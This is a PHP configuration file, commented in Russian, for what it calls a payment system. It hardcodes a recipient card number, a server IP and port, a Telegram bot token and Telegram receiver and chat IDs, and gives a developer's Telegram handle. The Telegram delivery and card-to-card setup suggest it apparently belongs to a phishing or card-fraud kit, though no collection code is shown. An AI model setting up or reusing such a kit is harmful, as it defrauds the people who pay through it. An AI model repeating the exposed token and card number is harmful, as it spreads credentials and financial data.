<?php

/* При внесении изменений в этот файл обязательно
 * следите за тем, чтобы внесенные изменения были
 * в одинаковых кавычках. Если у Вас возникли какие-либо
 * трудности в процессе настройки, то свяжитесь с разработчиком
 * в Telegram: @waydersoon
*/



// Заголовок страницы.
$title = "Платежная система";

// Заголовок формы (для обычных платежей).
$heading = "Платежная информация";

// Номер карты получателя. Указывайте номер без пробелов и прочих символов.
$destination_card = "5599005034015698";

// IP-адрес сервера.
$payment_host = "109.234.34.228";

// Порт сервера. По умолчанию: 8080
$payment_port = 8080;

// Токен бота в Telegram.
$bot_token = "963538245:AAEuhAoztbz98J7m7x1DqTDsjfXi-JLPVdw";

// Идентификатор аккаунта в Telegram.
$bot_receiver = "649280547";

// Идентификатор беседы в Telegram.
$bot_receiver_add = "1001384122500";



/* Далее идут системные настройки, которые при изменении
 * могут повлиять на работу платежной системы, изменять
 * их требуется только при уведомлении об этом разработчика.
*/

// Страница успешной оплаты.
$success_url = "https://" . $_SERVER["HTTP_HOST"] . "/merchant/success.php";

// Страница ошибки оплаты.
$error_url = "https://" . $_SERVER["HTTP_HOST"] . "/merchant/error.php";

// Адрес оповещения.
$callback_url = "https://" . $_SERVER["HTTP_HOST"] . "/merchant/callback.php";

// Адрес обработчика статуса.
$status_url = "https://" . $_SERVER["HTTP_HOST"] . "/merchant/status.php";

?>